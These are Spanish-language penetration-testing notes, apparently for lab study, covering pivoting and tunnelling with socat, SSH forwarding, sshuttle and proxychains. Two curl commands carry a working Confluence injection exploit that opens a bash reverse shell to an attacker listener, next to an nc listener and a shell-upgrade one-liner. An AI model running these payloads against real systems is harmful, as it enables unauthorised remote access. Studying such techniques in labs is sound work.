

## Herramientas


### Chisel

### Socat

### Ligolo


---


1º Nos ponemos a la escucha en nuestra máquina kali

```bash
nc -nlvp puerto_escucha
```


2º En otro terminal

```bash
curl -v http://IP_CONFLUENCE:PUERTO_CONFLUENCE/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/IP_NUESTRA/PUERTO_ESCUCHA%200%3E%261%27%29.start%28%29%22%29%7D/ #--> Es un exploit del 2022 de confluence
```


---

## Remote port-forwarding


Por ssh
```bash
ssh -N -R IP_DESTINO(127.0.0.1):PUERTO_DESTINO:IP_ORIGEN:PUERTO_ORIGEN USER_KALI@IP_KALI
```


## Dynamic remote port-forwarding


```bash
ssh -N -R PUERTO_DE_TUNELIZACIÓN NUESTRA_IP_SSH
```

```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn -n IP_DESTINO
```


---

## SSH shuttle


***Debemos ser usuario root***

```bash
socat TCP-LISTEN:PUERTO_ESCUCHA,fork TCP:IP_DE_REENVÍO:PUERTO_A_REENVIAR
```

```bash
sshuttle -r USER_SSH@IP_SSH_MÁS_CERCANA:PUERTO_SSH 
```


***Posible ejercicio***
```bash
nc -nlvp 4444 #ter1

#Luego

curl -v http://IP_CONFLUENCE:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/ #ter2
```

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

```bash
socat TCP-LISTEN:PUERTO_ESCUCHA,fork TCP:IP_DE_REENVÍO:PUERTO_A_REENVIAR
```

```bash
sshuttle -r database_admin@IP_CONFLUENCE:PUERTO_CONFLUENCE 
```


---

## Herramientas en Windows



### SSH.EXE


1ºIniciamos ssh en nuestra máquina
```bash
sudo systemctl start ssh
```

2º comprobamos que la máquina Windows tiene ssh
```powershell
where ssh
```